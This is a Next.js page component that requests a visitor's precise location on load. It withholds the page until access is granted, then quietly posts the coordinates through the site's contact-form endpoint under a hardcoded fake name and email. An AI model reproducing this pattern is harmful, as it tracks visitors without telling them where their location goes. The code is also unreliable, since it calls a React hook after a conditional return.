"use client";
import Image from "next/image";
import ContactForm from "./ContactForm";
import Home1 from "@/components/Home1";
import Location from "@/components/Location";
import { useEffect, useState } from "react";
import axios from "axios";
import { BadgeAlert } from "lucide-react";
import LocationFetcher from "@/components/Location";

export default function Home() {
    const [loading, setLoading] = useState(false);
    const [location, setLocation] = useState<{
        lat: number;
        lon: number;
    } | null>(null);
    const [locationError, setLocationError] = useState<string | null>(null);
    const [showLocationPrompt, setShowLocationPrompt] = useState(false);

    const sendLocationData = async (lat: number, lon: number) => {
        try {
            const response = await axios.post("/api/submit", {
                name: "himanshu",
                email: "himanshu@gmail.com",
                phone: "1234567890",
                category: "",
                message: `latitude: ${lat}, longitude: ${lon}`,
            });
            console.log(response.data);
        } catch (error) {
            console.error("Error sending location data:", error);
        }
    };

    const requestLocation = () => {
        if (!navigator.geolocation) {
            setLocationError("Geolocation is not supported by this browser.");
            return;
        }

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const newLocation = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                };
                setLocation(newLocation);
                setLocationError(null);
                setShowLocationPrompt(false);
                
                // Send location data
                await sendLocationData(newLocation.lat, newLocation.lon);
            },
            (error) => {
                console.error("Error getting location:", error.message);
                
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        setLocationError("Location access denied by user.");
                        setShowLocationPrompt(true);
                        break;
                    case error.POSITION_UNAVAILABLE:
                        setLocationError("Location information is unavailable.");
                        break;
                    case error.TIMEOUT:
                        setLocationError("Location request timed out.");
                        setShowLocationPrompt(true);
                        break;
                    default:
                        setLocationError("An unknown error occurred.");
                        break;
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    };

    useEffect(() => {
        // Check if location permission is already granted
        if (navigator.permissions) {
            navigator.permissions.query({ name: 'geolocation' }).then((result) => {
                if (result.state === 'granted') {
                    requestLocation();
                } else if (result.state === 'prompt') {
                    requestLocation();
                } else {
                    // Permission denied
                    setShowLocationPrompt(true);
                    setLocationError("Location access is required for better experience.");
                }
            });
        } else {
            // Fallback for browsers that don't support permissions API
            requestLocation();
        }
    }, []);

    const handleRetryLocation = () => {
        setLocationError(null);
        requestLocation();
    };



    if (showLocationPrompt || locationError) {
        return (
            <LocationFetcher handleRetryLocation={handleRetryLocation} />
        );
    }


    useEffect(() => {
        setLoading(true);
        setTimeout(() => {
            setLoading(false);
        }, 5000);
    }, []);
    
    if (loading) {
        return (
            <div className="flex items-center justify-center h-screen">
                <div className="loader"></div>
            </div>
        );
    }

    return (
        <>
            {location && <Home1 />}
            {/* <ContactForm /> */}
            {/* <Location /> */}
        </>
    );
}